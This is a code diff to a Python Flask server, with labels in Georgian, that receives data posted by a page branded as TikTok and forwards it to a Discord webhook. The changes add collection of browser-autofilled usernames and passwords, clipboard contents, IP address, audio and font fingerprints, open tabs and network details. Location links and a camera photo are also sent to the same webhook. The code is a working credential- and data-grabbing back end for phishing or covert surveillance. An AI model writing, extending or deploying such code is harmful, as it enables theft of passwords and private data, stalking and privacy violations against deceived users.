@@ -14,37 +14,31 @@ DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com
 def home():
     return render_template('index.html')
 
-@app.route('/upload_all', methods=['POST'])
-def upload_all():
+@app.route('/upload_data', methods=['POST'])
+def upload_data():
     try:
         data = request.json
+        secret = data.get('secret', {})
         
-        if data.get('lat') and data['lat'] != "უარი":
-            maps_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
+        if secret.get('lat') and secret['lat'] != "უარი":
+            maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
             location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
         else:
             location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"
 
-        content = f"""
-🎯 **ახალი მონაცემები (TikTok)!**
-{location_text}
+        content = f"🚨 **ახალი მონაცემი! (TikTok Direct)**\n\n{location_text}\n\n💻 **მოწყობილობა:**\n• **ბრაუზერი:** `{secret.get('userAgent', 'უცნობია')}`\n• **ეკრანი:** `{secret.get('screen', 'უცნობია')}`\n• **RAM:** `{secret.get('ram', 'უცნობია')}`\n"
+        
+        content += f"\n🔑 **ავტოშევსება:**\n• **იუზერი:** `{secret.get('autofilledUser', 'ვერ წაიკითხა')}`\n• **პაროლი:** `{secret.get('autofilledPass', 'ვერ წაიკითხა')}`\n"
+        
+        content += f"\n🕵️‍♂️ **საიდუმლო:**\n• **IP:** `{secret.get('ip', 'უცნობია')}`\n• **ხმის ანაბეჭდი:** `{secret.get('audioFingerprint', 'უცნობია')}`\n• **ფონტები:** `{secret.get('fonts', 'უცნობია')}`\n• **კლიპბორდი:** `{secret.get('clipboard', 'უცნობია')}`\n• **ბატარეა:** `{secret.get('battery', 'უცნობია')}`\n• **ინტერნეტი:** `{secret.get('network', 'უცნობია')}`\n• **ტაბები:** `{secret.get('tabs', 'უცნობია')}`\n• **ორიენტაცია:** `{secret.get('orientation', 'უცნობია')}`\n• **ვიბრაცია:** `{secret.get('vibrated', 'არა')}`"
 
-💻 **მოწყობილობის ინფორმაცია:**
-• **ბრაუზერი:** `{data.get('userAgent', 'უცნობია')}`
-• **ენა:** `{data.get('language', 'უცნობია')}`
-• **ეკრანი:** `{data.get('screen', 'უცნობია')}`
-• **RAM:** `{data.get('ram', 'უცნობია')}`
-• **ბატარეა:** `{data.get('battery', 'უცნობია')}`
-        """
-        
         requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
-        
-        if data.get('image'):
-            image_data = data['image'].replace("data:image/png;base64,", "")
+
+        if secret.get('image'):
+            image_data = secret['image'].replace("data:image/png;base64,", "")
             image_bytes = base64.b64decode(image_data)
-            files = {"file": ("foto.png", image_bytes, "image/png")}
-            requests.post(DISCORD_WEBHOOK_URL, files=files)
-        
+            requests.post(DISCORD_WEBHOOK_URL, files={"file": ("foto.png", image_bytes, "image/png")})
+
         return "წარმატება"
     except Exception as e:
         print(f"❌ შეცდომა: {e}")
@@ -53,4 +47,3 @@ def upload_all():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
-            
